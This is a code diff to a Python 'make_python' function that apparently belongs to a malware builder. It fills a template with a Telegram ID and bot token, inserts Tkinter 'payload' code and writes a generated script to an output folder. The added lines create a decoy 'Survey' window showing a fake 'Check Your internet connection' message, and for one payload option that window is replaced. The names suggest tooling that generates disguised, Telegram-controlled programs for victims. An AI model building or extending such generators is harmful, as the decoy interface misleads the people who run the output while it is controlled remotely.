@@ -81,7 +81,18 @@ def make_python(ID, TOKEN, NAME, CODE_ADDR):
             tkinter_code = """"""
             for i in reader:
                 tkinter_code += f"    {i}\n"
-        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code)
+            offline = """    root = Tk()
+    Label(root, text="Check Your internet connection", font=("", 15)).pack()
+    root.title("Survey")
+    root.geometry("300x300")
+    # picture = PhotoImage(file = fr'{cwd}\MSTL\Files\icon.ico')
+    # root.iconphoto(False, picture) 
+    root.resizable(False, False)
+    root.mainloop()"""
+        if CODE_ADDR == "builder/tk_payloads/none.py":
+            text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code).replace(offline, "    pass")
+        else:
+            text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code)            
     system("mkdir output")
     with open(f"output/{NAME}.py", "w") as write:
         write.write(text)
